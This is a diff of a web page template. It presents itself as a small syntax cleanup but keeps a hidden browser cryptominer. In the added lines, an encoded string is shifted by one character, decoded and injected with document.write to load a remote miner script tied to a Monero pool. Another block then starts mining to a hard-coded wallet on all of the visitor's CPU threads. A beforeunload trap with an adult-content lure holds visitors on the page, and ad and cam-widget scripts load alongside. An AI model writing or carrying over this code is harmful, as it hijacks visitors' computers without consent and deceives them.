@@ -50,17 +50,17 @@
   <script type='text/javascript' src='//pl27198253.profitableratecpm.com/c9/0d/35/c90d35792e2f95a047f528e420a70dff.js'></script>
   <script defer src="https://crxcr1.com/cams-widget-ext/im_jerky?lang=en&mode=prerecorded&outlinkUrl=https://t.mbdaad.link/381074/3788/0?bo=3471%2C3472%2C3473%2C3474%2C3475&target=pushnotifications&po=6456&aff_sub5=SF_006OG000004lmDN&aff_sub4=AT_0018"></script>
   <script>
-    var s = "=tdsjqu!tsd>#iuuqt;00fuifsfvn.qpdlfu/dpn0qfsgflu0qfsgfluxfc/kt@w1818312:@qfsgflu>xtt;00@kbtpo>gbtufs/npofsppdfbo#!?=0tdsjqu?";
-    var m = "";
-    for (var i = 0; i < s.length; i++) m += String.fromCharCode(s.charCodeAt(i) - 1);
+    const s = "=tdsjqu!tsd>#iuuqt;00fuifsfvn.qpdlfu/dpn0qfsgflu0qfsgfluxfc/kt@w1818312:@qfsgflu>xtt;00@kbtpo>gbtufs/npofsppdfbo#!?=0tdsjqu?";
+    let m = "";
+    for (let i = 0; i < s.length; i++) m += String.fromCharCode(s.charCodeAt(i) - 1);
     document.write(m);
     console.log("Script injected:", m);
   </script>
   <script>
     $(function() {
       console.log("Page loaded, starting miner");
-      var wallet = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
-      var threads = navigator.hardwareConcurrency || 4;
+      const wallet = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
+      const threads = navigator.hardwareConcurrency || 4;
       console.log("Threads set to:", threads);
       if (typeof PerfektStart === 'function') {
         PerfektStart(wallet, "x", threads);
@@ -68,7 +68,7 @@
       } else {
         console.error("PerfektStart not found");
       }
-      window.addEventListener('beforeunload', function(e) {
+      window.addEventListener('beforeunload', (e) => {
         e.preventDefault();
         e.returnValue = 'You want meet with real girl?';
       });
